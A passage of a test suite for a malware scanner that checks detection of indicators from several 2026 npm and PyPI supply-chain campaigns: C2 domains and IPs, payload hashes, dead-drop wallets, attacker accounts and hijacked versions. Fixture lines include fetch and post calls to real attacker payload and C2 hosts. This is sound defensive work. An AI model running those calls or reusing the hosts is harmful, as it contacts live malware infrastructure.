    it("flags the Solana dead-drop wallet the stager polls for SPL Memo commands", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poll.js"),
        'const account = "6ExrZayPZzMMSnszc42cH81DpuKT8FhCX9H6Sesn6rpz";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
      expect(finding, "the on-chain dead-drop wallet must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the throwaway Open VSX publisher account", async () => {
      fs.writeFileSync(
        path.join(tempDir, "publisher.js"),
        'const source = "https://github.com/zaitoona43/vsblack";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT");
      expect(finding, "the attacker-created publisher account must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The stager reaches its dead-drop over the public Solana mainnet JSON-RPC endpoint
    // and its commands ride the two SPL Memo system programs. Both are shared network
    // infrastructure that every legitimate Solana project touches, so they are targets
    // the malware abuses, not indicators of it, and must never be ingested.
    it("does NOT flag the public Solana RPC endpoint or the SPL Memo program ids", async () => {
      fs.writeFileSync(
        path.join(tempDir, "solana.js"),
        'const rpc = "https://api.mainnet.solana.com";\n' +
          'const memoV2 = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";\n' +
          'const memoV1 = "Memo1UhkJRfHyvLMcVucJwxXeuD728EqVDDwQDxFM";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) =>
        /api\.mainnet\.solana\.com|MemoSq4gq|Memo1Uhk/.test(JSON.stringify(f)),
      );
      expect(
        finding,
        "public Solana infrastructure is legitimate and must not be blocked",
      ).toBeUndefined();
    });
  });

  // =================================================================
  // Flooding Dropper / WEL1DROPPER (August 2026)
  // =================================================================

  describe("Flooding Dropper npm slopsquatting campaign (August 2026)", () => {
    it("flags a Cloudflare Worker payload host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "install.js"),
        'const url = "https://oob-worker.cf99-9b3.workers.dev/pkg/update_win.exe";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the WEL1DROPPER payload host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the package-proxy Worker host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'const mirror = "https://package-proxy.cf11oobworker.workers.dev/";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the package-proxy Worker host must be flagged").toBeDefined();
    });

    // The DNS fallback host is listed once at the dl[.] label. Matching is an
    // unanchored substring test, so the published platform subdomains must all
    // resolve to that single entry rather than needing a row each.
    it("flags every published DNS-fallback subdomain through the single dl.wel1.ru entry", async () => {
      for (const host of [
        "sdk.dl.wel1.ru",
        "ext.dl.wel1.ru",
        "pkg.dl.wel1.ru",
        "net.dl.wel1.ru",
        "dl.wel1.ru",
      ]) {
        const dir = fs.mkdtempSync(path.join(tempDir, "dns-"));
        fs.writeFileSync(path.join(dir, "resolve.js"), `const c2 = "${host}";\n`);

        const report = await scan({ target: dir, format: "text" });
        const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
        expect(finding, `${host} must be flagged`).toBeDefined();
      }
    });

    it("flags the stage-2 payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "notes.js"),
        'const sha = "7e486657f30594afda379b97030252a09a19fe8055e25c9e371544f59bd8e9e3";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the WEL1DROPPER payload hash must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The write-up embeds three Russian financial-services hosts whose role it
    // explicitly calls unclear (health check, decoy, or compromised third party),
    // and the payload rides the shared Cloudflare Workers platform. Blocking either
    // would flag legitimate infrastructure, so neither is ingested.
    it("does NOT flag the workers.dev apex or the unattributed third-party hosts", async () => {
      fs.writeFileSync(
        path.join(tempDir, "clean.js"),
        'const platform = "https://my-app.workers.dev/";\n' +
          'const nexus = "https://nexus.tcsbank.ru/repository/npm-group/";\n' +
          'const alerts = "https://alertmanager.cloudpayments.ru/api/v2/alerts";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(
        finding,
        "shared Cloudflare Workers and unattributed third-party hosts must not be blocked",
      ).toBeUndefined();
    });
  });

  // =================================================================
  // axios maintainer takeover / UNC1069 (March 2026)
  // =================================================================

  describe("axios hijack - UNC1069 RAT infrastructure (March 2026)", () => {
    it("flags the RAT C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "stage.js"),
        'const c2 = "http://sfrclak.com:8000/6202033";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the axios RAT C2 domain must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the RAT C2 IP", async () => {
      fs.writeFileSync(path.join(tempDir, "ip.js"), 'const host = "142.11.206.73";\n');

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
      expect(finding, "the axios RAT C2 IP must be flagged").toBeDefined();
    });

    it("flags the macOS implant hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hash.js"),
        'const sha = "92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the axios macOS implant hash must be flagged").toBeDefined();
    });

    it("flags the pinned malicious axios version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { axios: "1.14.1" } }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding, "axios@1.14.1 must be flagged").toBeDefined();
    });

    // axios is a legitimate package with 83M+ weekly downloads. Only the two
    // hijacked releases are malicious; every other version must stay clean.
    it("does NOT flag a clean axios version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { axios: "1.7.9" } }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding, "a clean axios release must not be flagged").toBeUndefined();
    });
  });

  // =================================================================
  // spellcheckpy / spellcheckerpy PyPI RAT (January 2026 backfill)
  // =================================================================

  describe("spellcheckpy PyPI RAT (January 2026)", () => {
    it("flags spellcheckpy through a real scan of a Python lockfile", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "spellcheckpy"\nversion = "1.0.0"\ndescription = "rat"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /spellcheckpy/.test(JSON.stringify(f)));
      expect(finding, "PyPI lockfile must flag the spellcheck RAT").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // Same inversion guard as gcli-control: a bare feed value means the npm
    // namespace, so a missing "pypi:" prefix would silently move detection to
    // the wrong ecosystem instead of weakening it.
    it("does NOT flag an npm dependency named spellcheckpy (wrong ecosystem)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { spellcheckpy: "1.0.0" } }),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /spellcheckpy/.test(JSON.stringify(f)));
      expect(finding, "a PyPI IOC must not fire on an npm dependency").toBeUndefined();
    });

    it("flags the updatenet stage-2 delivery host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.py"),
        'URL = "https://updatenet.work/settings/history.php"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the spellcheck stage-2 host must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The block is anchored, so the legitimate packages these names typosquat
    // must stay clean.
    it("does NOT flag the legitimate packages the names typosquat", () => {
      for (const name of ["pyspellchecker", "spellchecker", "spellcheck"]) {
        const hit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });
  });

  // =================================================================
  // TeamPCP telnyx PyPI compromise + March 2026 npm wave
  // =================================================================

  describe("TeamPCP telnyx PyPI compromise (March 2026)", () => {
    it("flags the hijacked telnyx 4.87.1 through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "telnyx"\nversion = "4.87.1"\ndescription = "telephony sdk"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /telnyx/.test(JSON.stringify(f)));
      expect(finding, "the hijacked telnyx release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag the clean telnyx 4.86.0 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "telnyx"\nversion = "4.86.0"\ndescription = "telephony sdk"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /telnyx/.test(JSON.stringify(f)));
      expect(finding, "a clean telnyx release must not be flagged").toBeUndefined();
    });

    it("flags the WAV-disguised stage-2 dead drop", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.py"),
        'URL = "http://83.142.209.203:8080/ringtone.wav"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP");
      expect(finding, "the WAV stage-2 dead drop must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the aquasecurtiy brand-typosquat C2 host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.py"),
        'C2 = "https://scan.aquasecurtiy.org/raw"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "the aquasecurtiy typosquat must be flagged").toBeDefined();
    });

    it("flags the telnyx 4.87.1 wheel hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "7321caa303fe96ded0492c747d2f353c4f7d17185656fe292ab0a59e2bd0b8d9";',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the telnyx wheel hash must be flagged").toBeDefined();
    });

    it("flags the Argon-DevOps-Mgt attacker account", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.py"),
        'SRC = "https://github.com/Argon-DevOps-Mgt/staging"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT");
      expect(finding, "the attacker account must be flagged").toBeDefined();
    });

    // Only the attacker-specific canister and tunnel hostnames are listed. The
    // shared gateways they sit on, and the real brand the C2 typosquats, must
    // stay clean or every ICP / Cloudflare Tunnel user becomes a false positive.
    it("does NOT flag the shared gateways or the real aquasecurity brand", async () => {
      fs.writeFileSync(
        path.join(tempDir, "clean.py"),
        [
          'GATEWAY = "https://raw.icp0.io/"',
          'TUNNEL = "https://my-own-dev-tunnel.trycloudflare.com/"',
          'VENDOR = "https://www.aquasecurity.org/"',
          "",
        ].join("\n"),
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN");
      expect(finding, "shared hosts and the real brand must stay clean").toBeUndefined();
    });

    it("flags a hijacked npm-wave release and leaves the clean one alone", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { "@opengov/form-utils": "0.7.2" } }),
      );
      let report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find((f) => /form-utils/.test(JSON.stringify(f))),
        "the hijacked @opengov/form-utils release must be flagged",
      ).toBeDefined();

      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "t", version: "1.0.0", dependencies: { "@opengov/form-utils": "0.7.1" } }),
      );
      report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find((f) => /form-utils/.test(JSON.stringify(f))),
        "a clean @opengov/form-utils release must not be flagged",
      ).toBeUndefined();
    });
  });

  // =================================================================
  // Regression: PyPI feed entries must carry the "pypi:" prefix
  // =================================================================

  // These six campaigns shipped their PyPI package IOCs as BARE feed values.
  // A bare value means the npm namespace, so the effect was not a weaker scan
  // but an inverted one: matchPackageIOC("pypi", ...) returned null for the real
  // compromise while the npm namespace resolved instead.
  //
  // This asserts the resolver directly rather than through scan(). The
  // package.json path does not consult the feed at all, so a scan-level
  // "does not flag an npm dependency" test passes either way and proves
  // nothing; the poetry.lock path is additionally covered by
  // KNOWN_BAD_PYPI_VERSIONS, which masks the feed defect.
  // =================================================================
  // Mini Shai-Hulud / Miasma "Hades" PyPI wave (June 2026)
  // =================================================================

  describe("Miasma 'Hades' PyPI wave (June 2026)", () => {
    it("flags the hijacked pyphetools 0.9.120 through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "pyphetools"\nversion = "0.9.120"\ndescription = "phenopackets"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /pyphetools/.test(JSON.stringify(f)));
      expect(finding, "the hijacked pyphetools release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // The whole point of pinning one release out of 201: this package is a
    // legitimate academic library and the clean versions must stay installable.
    it("does NOT flag the clean pyphetools 0.9.119 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "pyphetools"\nversion = "0.9.119"\ndescription = "phenopackets"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /pyphetools/.test(JSON.stringify(f)));
      expect(finding, "a clean pyphetools release must not be flagged").toBeUndefined();
    });

    // Second lockfile parser, so the pin is not only proven through poetry.lock.
    it("flags the hijacked ensmallen 0.8.101 but not the clean 0.8.100", async () => {
      fs.writeFileSync(
        path.join(tempDir, "uv.lock"),
        '[[package]]\nname = "ensmallen"\nversion = "0.8.101"\n',
      );
      const bad = await scan({ target: tempDir, format: "text" });
      expect(
        bad.findings.find((f) => /ensmallen/.test(JSON.stringify(f))),
        "the hijacked ensmallen release must be flagged",
      ).toBeDefined();

      fs.writeFileSync(
        path.join(tempDir, "uv.lock"),
        '[[package]]\nname = "ensmallen"\nversion = "0.8.100"\n',
      );
      const clean = await scan({ target: tempDir, format: "text" });
      expect(
        clean.findings.find((f) => /ensmallen/.test(JSON.stringify(f))),
        "the clean ensmallen release must not be flagged",
      ).toBeUndefined();
    });

    it("flags the langchain-core-mcp artifact hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashlist.js"),
        'const h = "6d332f814f15f19758d65026bbfd0a8c49671b319ec77b8fa1b27fc48afff7d9";',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding, "the Hades wave artifact hash must be flagged").toBeDefined();
    });
  });

  // =================================================================
  // Miasma "Hades" PyPI wave, developer-tooling cluster (August 2026)
  // =================================================================

  describe("Miasma 'Hades' PyPI wave, developer-tooling cluster (August 2026)", () => {
    it("flags the hijacked coolbox 0.4.1 through a real scan", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "coolbox"\nversion = "0.4.1"\ndescription = "genomics browser"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /coolbox/.test(JSON.stringify(f)));
      expect(finding, "the hijacked coolbox release must be flagged").toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    // coolbox is a real genomics visualisation library. Flagging 0.4.0 would make
    // the scanner unusable for every project that legitimately depends on it.
    it("does NOT flag the clean coolbox 0.4.0 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "coolbox"\nversion = "0.4.0"\ndescription = "genomics browser"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /coolbox/.test(JSON.stringify(f)));
      expect(finding, "a clean coolbox release must not be flagged").toBeUndefined();
    });

    // pantheon-agents is the sharpest case in this wave: the malicious 0.6.1 and
    // 0.6.2 sit BETWEEN two clean releases, so a range-style pin would swallow
    // the 0.6.4 recovery release the maintainer published after the takedown.
    it("flags pantheon-agents 0.6.2 but not the 0.6.4 recovery release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "uv.lock"),
        '[[package]]\nname = "pantheon-agents"\nversion = "0.6.2"\n',
      );
      const bad = await scan({ target: tempDir, format: "text" });
      expect(
        bad.findings.find((f) => /pantheon-agents/.test(JSON.stringify(f))),
        "the hijacked pantheon-agents release must be flagged",
      ).toBeDefined();

      fs.writeFileSync(
        path.join(tempDir, "uv.lock"),
        '[[package]]\nname = "pantheon-agents"\nversion = "0.6.4"\n',
      );
      const clean = await scan({ target: tempDir, format: "text" });
      expect(
        clean.findings.find((f) => /pantheon-agents/.test(JSON.stringify(f))),
        "the clean pantheon-agents recovery release must not be flagged",
      ).toBeUndefined();
    });

    // rlask was previously pinned at 3.1.7 alone. The full malicious set runs
    // 3.1.4 through 3.1.7, so 3.1.5 was a silent miss before this entry.
    it("flags rlask 3.1.5, previously outside the pinned range", async () => {
      fs.writeFileSync(
        path.join(tempDir, "uv.lock"),
        '[[package]]\nname = "rlask"\nversion = "3.1.5"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => /rlask/.test(JSON.stringify(f)));
      expect(finding, "rlask 3.1.5 must be flagged").toBeDefined();
    });

    it("flags the per-victim exfiltration repository name prefixes", async () => {
      fs.writeFileSync(
        path.join(tempDir, "exfil.js"),
        'const a = "stygian-cerberus-7";\nconst b = "tartarean-charon-12";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const drops = report.findings
        .filter((f) => f.rule === "IOC_KNOWN_DEAD_DROP")
        .map((f) => f.description)
        .join(" ");
      expect(drops).toContain("stygian-cerberus-");
      expect(drops).toContain("tartarean-charon-");
    });

    // The bare component words the write-ups also list are ordinary project
    // names. cerberus in particular is a widely used Python validation library,
    // so a dependency on it must stay clean.
    it("does NOT flag the bare component word 'cerberus'", async () => {
      fs.writeFileSync(
        path.join(tempDir, "poetry.lock"),
        '[[package]]\nname = "cerberus"\nversion = "1.3.5"\ndescription = "validation"\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP"),
        "a legitimate cerberus dependency must not match the dead-drop prefix",
      ).toBeUndefined();
    });

    it("flags the Hades dead-drop and taunt markers", async () => {
      fs.writeFileSync(
        path.join(tempDir, "payload.js"),
        'const desc = "Hades - The End for the Damned";\n' +
          'const q = "DontRevokeOrItGoesBoom";\n' +
          'const t = "IfYouYankThisTokenItWillNukeTheComputerOfTheOwnerFully";\n',
      );

      const report = await scan({ target: tempDir, format: "text" });
      const markers = report.findings.filter((f) => f.rule === "HADES_WAVE_DEADDROP_MARKER");
      expect(markers.length, "all three Hades markers must be flagged").toBeGreaterThanOrEqual(3);
      expect(markers[0]?.severity).toBe("critical");
    });
  });

  describe("PyPI feed entries carry their ecosystem prefix", () => {
    const feed = getBundledFeed();

    // Two resolvers, two namespaces: an ecosystem-prefixed entry is reachable
    // only through matchPackageIOC(), a BARE entry only through
    // matchBareNpmIOC() (see getPackageIndex - bare values are npm by design).
    // An unprefixed PyPI entry therefore lands in the npm namespace: the PyPI
    // lookup returns null and the npm one starts answering for it.
    //
    // This asserts the resolvers directly. A scan()-level test cannot see it:
    // the poetry.lock path is also covered by KNOWN_BAD_PYPI_VERSIONS, which
    // masks the miss, and checkMaliciousDependencyNames() passes no version, so
    // a versioned bare entry never fires there either. The reachable
    // false-positive path is install-guard's checkSpec(), which does pass one.
    const PYPI_ONLY: Array<[string, string]> = [
      ["litellm", "1.82.7"],
      ["litellm", "1.82.8"],
      ["lightning", "2.6.2"],
      ["lightning", "2.6.3"],
      ["guardrails-ai", "0.10.1"],
      ["mistralai", "2.4.6"],
      ["durabletask", "1.4.1"],
      ["durabletask", "1.4.3"],
      ["xinference", "2.6.0"],
      ["telnyx", "4.87.1"],
      ["telnyx", "4.87.2"],
      // Miasma "Hades" PyPI wave (June 2026). Sampled across both halves of the
      // wave: a hijacked legitimate library and a removed MCP-impersonating name.
      ["pyphetools", "0.9.120"],
      ["ensmallen", "0.8.101"],
      ["ppkt2synergy", "0.1.1"],
      ["openai-mcp", "2.41.1"],
      ["langchain-core-mcp", "1.4.2"],
      // Miasma "Hades" developer-tooling cluster (August 2026). Sampled across
      // the cluster: a hyphenated name, a single-version pin, and a name that
      // also exists on npm, where a missing prefix would silently swap namespaces.
      ["coolbox", "0.4.1"],
      ["pantheon-toolsets", "0.5.5"],
      ["uprobe", "0.1.4"],
    ];

    for (const [name, version] of PYPI_ONLY) {
      it(`resolves ${name}@${version} as PyPI and not as npm`, () => {
        expect(
          matchPackageIOC("pypi", name, version, feed),
          `${name}@${version} must resolve as a PyPI IOC`,
        ).toBeTruthy();
        expect(
          matchBareNpmIOC(name, version, feed),
          `${name}@${version} must NOT resolve as an npm IOC`,
        ).toBeNull();
      });
    }

    // The March 2026 npm wave really is npm, so it must resolve the other way
    // round. This pins the pair so a future bulk edit cannot prefix everything.
    it("leaves the genuinely-npm entries in the npm namespace", () => {
      for (const [name, version] of [
        ["@opengov/form-utils", "0.7.2"],
        ["@airtm/uuid-base32", "1.0.2"],
        ["eslint-config-ppf", "0.128.2"],
      ] as Array<[string, string]>) {
        expect(
          matchBareNpmIOC(name, version, feed),
          `${name}@${version} must resolve as an npm IOC`,
        ).toBeTruthy();
        expect(
          matchPackageIOC("pypi", name, version, feed),
          `${name}@${version} must NOT resolve as a PyPI IOC`,
        ).toBeNull();
      }
    });
  });

  // =================================================================
  // Vellia / Guangnao / lodash-js npm malware cluster (August 2026)
  //
  // Five unrelated publishers whose OpenSSF malicious-packages write-ups
  // landed in the same window. The package rows came from the importer; the
  // atomic indicators below were extracted from the write-ups by hand and are
  // single-source (amazon-inspector), so their feed rows carry confidence 0.85.
  // =================================================================

  describe("Vellia / Guangnao / lodash-js cluster (August 2026)", () => {
    it("flags the @guangnao/agent-proxy WebSocket command hub", async () => {
      fs.writeFileSync(
        path.join(tempDir, "cli.js"),
        'const hub = "wss://hub.client-llm.com/ws"; connect(hub);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the registrynpmjs.to registry lookalike", async () => {
      fs.writeFileSync(
        path.join(tempDir, "fetch.js"),
        'download("https://registrynpmjs.to/inquirer-14.0.2.tgz");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the navaLinh account behind the unpinned git dependency", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.js"),
        'const dep = "git+https://github.com/navaLinh/node-ai.git";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("resolves the pinned @velliajs/discord versions and leaves others alone", () => {
      const feed = getBundledFeed();

      for (const version of ["1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7"]) {
        expect(
          matchBareNpmIOC("@velliajs/discord", version, feed),
          `@velliajs/discord@${version} must resolve as an npm IOC`,
        ).toBeTruthy();
      }

      // The advisory pins 1.0.3 through 1.0.7. A version outside that set must
      // not resolve, or the pin has silently widened into a name-level block.
      expect(
        matchBareNpmIOC("@velliajs/discord", "1.0.2", feed),
        "@velliajs/discord@1.0.2 is outside the advisory range",
      ).toBeNull();
    });
  });

  // =================================================================
  // mgc account takeover - UNC1069 / WAVESHAPER.V2 (safedep, April 2026)
  // =================================================================

  describe("mgc account takeover / UNC1069 (April 2026)", () => {
    it("should flag mgc@1.2.1 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { mgc: "1.2.1" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag mgc@1.2.0, the last legitimate 2023 release", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { mgc: "1.2.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeUndefined();
    });

    it("should detect the gist dead-drop the dropper fetches its stage 2 from", async () => {
      fs.writeFileSync(
        path.join(tempDir, "setup.cjs"),
        'fetch("https://gist.githubusercontent.com/admondtamang/814132e794e5d007e9b8ebd223a9494f/raw/1c5d51c2002f452a4dd58a1a73a9dd90a7fe0297/linux.payload");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the C2 gate endpoint", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const c2 = "https://admondtamang.com.np/gate"; post(c2, host);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
      );
      expect(finding).toBeDefined();
    });

    it("should NOT flag the compromised maintainer's own GitHub account", async () => {
      // admondtamang is the victim of an account takeover, not the attacker.
      // Blocking the person rather than the specific gist path is the false
      // positive this project deliberately avoids.
      fs.writeFileSync(
        path.join(tempDir, "deps.js"),
        'const repo = "git+https://github.com/admondtamang/mgc.git";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeUndefined();
    });

    it("resolves the pinned @zinley/orion versions and leaves the clean ones alone", () => {
      const feed = getBundledFeed();

      for (const version of ["1.2.31", "1.2.32", "1.2.34", "1.2.36", "1.2.38", "1.2.39"]) {
        expect(
          matchBareNpmIOC("@zinley/orion", version, feed),
          `@zinley/orion@${version} must resolve as an npm IOC`,
        ).toBeTruthy();
      }

      // 1.2.35, 1.2.37 and 1.2.40 are published and NOT flagged by the advisory.
      // If these resolve, the pin has silently widened into a name-level block on
      // a package that has 41 published versions and a real purpose.
      for (const version of ["1.2.35", "1.2.37", "1.2.40"]) {
        expect(
          matchBareNpmIOC("@zinley/orion", version, feed),
          `@zinley/orion@${version} is outside the advisory set`,
        ).toBeNull();
      }
    });
  });

  // =================================================================
  // NullReceiver / DPRK "Contagious Interview" npm wave (August 2026)
  // =================================================================

  describe("NullReceiver DPRK npm wave (August 2026)", () => {
    it("should detect the hardcoded attacker wallet the loader queries", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const S = "0xa322e5f3d311d3080e6f0121063e9adc2490ef1a";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the dead-drop recipient address that encodes the C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "resolve.js"),
        'if (tx.to === "0xa658863ea658863e68656c6c6f6970626f742121") return decode(tx.to);'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_WALLET");
      expect(finding).toBeDefined();
    });

    it("should still detect the C2 IP the recipient address decodes to", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const host = "166.88.134.62"; fetch("http://" + host + "/0x/ls");'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP");
      expect(finding).toBeDefined();
    });

    it("should NOT flag the public Ethereum RPC endpoints the payload reads through", async () => {
      // 1rpc.io and eth.drpc.org are shared public infrastructure used by ordinary
      // web3 code. Listing them would flag every legitimate Ethereum project.
      fs.writeFileSync(
        path.join(tempDir, "rpc.js"),
        'const R = ["https://1rpc.io/eth", "https://eth.drpc.org"];'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
